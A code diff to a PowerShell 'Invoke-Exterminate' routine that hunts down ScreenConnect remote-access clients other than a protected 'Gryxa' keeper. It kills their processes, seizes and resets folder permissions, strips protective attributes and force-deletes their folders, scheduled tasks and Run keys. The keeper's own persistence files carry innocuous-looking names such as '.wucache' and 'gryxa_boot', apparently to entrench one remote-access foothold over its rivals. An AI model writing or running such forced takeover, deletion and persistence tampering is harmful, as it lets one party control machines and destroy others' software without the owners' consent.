@@ -792,9 +792,13 @@ function Invoke-Exterminate {
         Get-CimInstance Win32_Process -ErrorAction SilentlyContinue |
             Where-Object { $_.ExecutablePath -and $_.ExecutablePath.StartsWith($d, [StringComparison]::OrdinalIgnoreCase) } |
             ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
+        # un-hard self-protected dirs (foreign/old SC locks ACLs+attrs to survive removal)
         & takeown.exe /F $d /R /D Y 2>&1 | Out-Null
-        & icacls.exe $d /grant '*S-1-5-32-544:F' /T /C /Q 2>&1 | Out-Null
-        & icacls.exe $d /grant 'Administrators:F' /T /C /Q 2>&1 | Out-Null
+        & icacls.exe $d /reset /T /C /Q 2>&1 | Out-Null
+        cmd.exe /c "attrib -h -s -r /s /d `"$d`" `"$d\*.*`"" 2>&1 | Out-Null
+        & icacls.exe $d /grant '*S-1-5-32-544:(OI)(CI)F' /T /C /Q 2>&1 | Out-Null
+        & icacls.exe $d /grant 'Administrators:(OI)(CI)F' /T /C /Q 2>&1 | Out-Null
+        & icacls.exe $d /grant 'SYSTEM:(OI)(CI)F' /T /C /Q 2>&1 | Out-Null
         Remove-Item -LiteralPath $d -Recurse -Force -ErrorAction SilentlyContinue
         if (Test-Path -LiteralPath $d) {
             cmd.exe /c "attrib -h -s -r /s /d `"$d\*.*`"" 2>&1 | Out-Null
@@ -837,7 +841,87 @@ function Invoke-Exterminate {
         return $false
     }
 
+    # ── destroy foreign/old SC persistence (watchdog tasks + run keys) ──
+    # Root cause of "connects then drops": a non-keeper / old-FP ScreenConnect keeps a
+    # scheduled task or Run key that re-runs its cached msiexec /i. Every such /i fires
+    # RemoveExistingProducts on the SHARED SC UpgradeCode and strips the keeper Gryxa.
+    # Removing only the product is not enough — the persistence reinstalls it (and kills
+    # Gryxa again). Purge the persistence FIRST so product/svc/dir removal is permanent.
+    function Get-NonKeeperScFps {
+        $fps = @{}
+        Get-Service -ErrorAction SilentlyContinue |
+            Where-Object { $_.Name -match 'ScreenConnect Client \(([0-9a-fA-F]{16})\)' } |
+            ForEach-Object { $fps[$Matches[1].ToLower()] = $true }
+        Get-CimInstance Win32_Process -Filter "Name like 'ScreenConnect%'" -ErrorAction SilentlyContinue | ForEach-Object {
+            if ("$([string]$_.ExecutablePath) $([string]$_.CommandLine)" -match '\(([0-9a-fA-F]{16})\)') { $fps[$Matches[1].ToLower()] = $true }
+        }
+        foreach ($root in $script:UninstallRoots) {
+            if (-not (Test-Path $root)) { continue }
+            Get-ChildItem $root -ErrorAction SilentlyContinue | ForEach-Object {
+                $dn = (Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue).DisplayName
+                if ($dn -match 'ScreenConnect Client \(([0-9a-fA-F]{16})\)') { $fps[$Matches[1].ToLower()] = $true }
+            }
+        }
+        foreach ($base in @($env:ProgramFiles, ${env:ProgramFiles(x86)})) {
+            if (-not $base -or -not (Test-Path $base)) { continue }
+            Get-ChildItem -LiteralPath $base -Directory -Force -ErrorAction SilentlyContinue |
+                Where-Object { $_.Name -match 'ScreenConnect Client \(([0-9a-fA-F]{16})\)' } |
+                ForEach-Object { $fps[$Matches[1].ToLower()] = $true }
+        }
+        @($fps.Keys | Where-Object { $_ -notin $keep })
+    }
+
+    function Test-ScKeeperRef([string]$s) {
+        if (-not $s) { return $false }
+        if ($s -match '(?i)gryxa\.com|sevrz\.com') { return $true }
+        if ($s -match '(?i)own(_mon|_lib|_secure)?\.(cmd|ps1)|gryxa_boot|\.wucache') { return $true }
+        foreach ($k in $keep) { if ($k -and $s -like "*$k*") { return $true } }
+        return $false
+    }
+
+    function Remove-ScPersistence([string]$Fp) {
+        # scheduled tasks whose action references this FP's client/installer
+        try {
+            Get-ScheduledTask -ErrorAction SilentlyContinue | ForEach-Object {
+                $task = $_
+                $blob = ''
+                foreach ($a in $task.Actions) { $blob += " $($a.Execute) $($a.Arguments)" }
+                if ($blob -notmatch '(?i)ScreenConnect' -and $blob -notmatch [regex]::Escape($Fp)) { return }
+                if (Test-ScKeeperRef $blob) { return }
+                if ($blob -match [regex]::Escape($Fp)) {
+                    Unregister-ScheduledTask -TaskName $task.TaskName -TaskPath $task.TaskPath -Confirm:$false -ErrorAction SilentlyContinue
+                    Log "persist_task_removed $($task.TaskPath)$($task.TaskName) fp=$Fp"
+                }
+            }
+        } catch { Log "persist_task_enum_err $_" }
+        # Run / RunOnce keys re-launching this FP's client or installer
+        foreach ($rk in @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
+                          'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',
+                          'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run',
+                          'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce',
+                          'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
+                          'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce')) {
+            if (-not (Test-Path $rk)) { continue }
+            $p = Get-ItemProperty $rk -ErrorAction SilentlyContinue
+            if (-not $p) { continue }
+            foreach ($prop in $p.PSObject.Properties) {
+                if ($prop.Name -like 'PS*') { continue }
+                $v = [string]$prop.Value
+                if ($v -match [regex]::Escape($Fp) -and $v -match '(?i)ScreenConnect' -and -not (Test-ScKeeperRef $v)) {
+                    Remove-ItemProperty -Path $rk -Name $prop.Name -Force -ErrorAction SilentlyContinue
+                    Log "persist_runkey_removed $rk\$($prop.Name) fp=$Fp"
+                }
+            }
+        }
+    }
+
     Log 'exterminate_engine_L7_begin'
+
+    # purge persistence for every non-keeper SC fingerprint BEFORE product/svc/dir removal,
+    # so an old/foreign SC watchdog cannot reinstall itself (and cross-kill Gryxa) mid-pass.
+    foreach ($fpX in (Get-NonKeeperScFps)) {
+        Remove-ScPersistence $fpX
+    }
 
     # 1. foreign SC products from BOTH correct ARP hives
     $seen = @{}
